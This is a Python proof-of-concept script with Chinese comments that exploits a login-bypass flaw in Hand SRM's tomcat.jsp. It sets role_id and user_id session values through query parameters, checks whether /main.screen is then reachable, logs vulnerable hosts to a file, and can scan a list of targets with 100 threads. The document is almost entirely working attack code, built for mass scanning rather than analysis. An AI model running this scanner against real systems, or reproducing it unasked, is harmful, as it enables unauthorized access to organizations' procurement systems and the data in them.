# 汉得SRM tomcat.jsp 登陆绕过漏洞
import argparse,requests,sys   #调用模块
from multiprocessing.dummy import Pool      #调用模块
requests.packages.urllib3.disable_warnings()       #证书错误抑制

# 定义指纹
def banner():   
    banner ='''

#                 #    #   ___                       
#=ooO=========Ooo=#    #  <_*_>            ,,,,,     
#  \\  (o o)  //  #    #  (o o)           /(o o)\    
--------(_)------------8---(_)--Ooo----ooO--(_)--Ooo-
                            @author:qbt
                            @version:0.0.1
'''
    print(banner)
# 定义poc
def poc(target):
    url = target+'/tomcat.jsp?dataName=role_id&dataValue=1'
    url1 = target+'/tomcat.jsp?dataName=user_id&dataValue=1'
    url2 = target + '/main.screen'
    headers = {
            'Cookie': 'JSESSIONID=823E35AF96E779C41FBAF32656CA6B42.jvm1; route=e5f841423e85173e5c9d73df8bb9c9d0; ISTIMEOUT=false; vh=710; vw=1488; rememberMe=test',
            'Cache-Control': 'max-age=0',
            'Sec-Ch-Ua': '"Microsoft Edge";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Ch-Ua-Platform': '"Windows"',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-User': '?1',
            'Sec-Fetch-Dest': 'document',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
            'Connection': 'close'
    }
    try:
# 发送一个get请求
        res = requests.get(url=url,headers=headers,verify=False,timeout=5)
        if 'role_id' in res.text:
            res1 = requests.get(url=url1,headers=headers,verify=False,timeout=5)
            if 'user_id' in res1.text:
                res2 = requests.get(url=url2,headers=headers,verify=False,timeout=5)
# 判断响应
                if res2.status_code == 200 :
                    print("[+]"+ target + "存在汉得SRM tomcat.jsp 登陆绕过漏洞")
                    with open('seccess.txt','a',encoding='utf-8') as f:
                        f.write('[+]'+target+'存在汉得SRM tomcat.jsp 登陆绕过漏洞\n')
                        return True
                else:
                    print("[-]"+ target + "不存在漏洞")
                    return False
    except:
        print('抛出一个错误')

# 定义主函数
def main():
    banner() #调用指纹函数
#实例化
    parser = argparse.ArgumentParser(description='汉得SRM tomcat.jsp 登陆绕过漏洞')
#定义参数
    parser.add_argument('-u','-url',dest='url',help='请输入url',type=str)
    parser.add_argument('-f','--file',dest='file',help='url.txt',type=str)
#处理命令行参数
    args = parser.parse_args()
#判断是单个url还是文件
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
#定义一个空列表
        url_list = []
#打开文件并以单行读取并输入到定义的列表中
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip().replace("\n",""))
#线程池为100
        mp = Pool(100)
#将列表的参数，输入到poc
        mp.map(poc, url_list)
#关闭多线程
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


#调用主函数，有防止被误操作导致直接执行的能力
if __name__ == '__main__':
    main()